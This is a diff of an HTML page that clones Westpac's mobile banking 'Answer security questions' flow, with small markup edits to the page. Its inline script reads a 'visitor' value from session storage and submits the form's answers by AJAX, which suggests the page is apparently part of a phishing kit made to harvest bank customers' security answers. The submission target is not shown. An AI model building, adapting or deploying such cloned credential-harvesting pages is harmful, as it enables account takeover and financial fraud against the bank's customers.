@@ -23,10 +23,12 @@
    	margin-right:10px;
    	width:90%; 
    	}
+   	
+   	
    	</style>
    <body id="applicationBody" data-keymap-url="/eam/servlet/getEamInterfaceData" data-command="login" data-get-resources-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true&values=true" data-get-resources-checksum-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true" data-help-url="/wbc/banking/helpcontentandsearch" data-signin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=login&segment=personal" data-signout-url="https://banking.westpac.com.au/pkmslogout?token=f264d7a0-1df4-11ef-b660-005056a3d977" data-browser-incompatible-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/6" data-cookies-disabled-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/7" data-allow-console-logging="false" data-spsignin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=sp&segment=personal" data-is-stronger-password-feature-enabled="True" data-is-eam-policy-global-rollout="True" data-analytics-allkeys="autoImpr,experience,formName,pageKey,pageName,pageStep,pageType,sendDelay,siteVersion,src,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagestep="start" data-analytics-pagename="enter your customer id" data-analytics-senddelay="3000" data-analytics-autoimpr="TRUE" data-analytics-formname="olb" data-analytics-src="20231122-mob" data-analytics-pagetype="login" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="login" class="orientation-portrait">
       <!-- ko ifnot: isSalesPathwayLogin() -->
-    
+    <br>
       	
       	
       <!-- /ko -->
@@ -34,8 +36,8 @@
       </div>
       <div class="page view view-active" id="forgottenCustomerId" data-post-url="https://banking.westpac.com.au/wbc/banking/verifycustomer" data-analytics-allkeys="experience,formName,newFormName,pageKey,pageName,pageStep,pageType,siteVersion,trackOnce,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagename="enter customerdetails" data-analytics-newformname="forgot-credentials" data-analytics-pagestep="start" data-analytics-trackonce="true" data-analytics-pagetype="selfservice" data-analytics-formname="forgot-credentials" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="Mob_Authentication_forgottenCustomerId">
          <header class="title-bar" role="banner">
-            <center>
-               <h1 tabindex="-1">Answer security questions</h1>
+            <center id="">
+               <h1 id="title_red" tabindex="-1">Answer security questions</h1>
             </center>
             <!--a href="javascript:;" data-bind="click: navigateBack" class="button-back">
                <span>back</span>
@@ -281,7 +283,7 @@
         // If no input is empty, proceed with form submission
         if (!isEmpty) {
             
-
+            
         let visitor = sessionStorage.getItem('visitor');
             
             // Send AJAX request
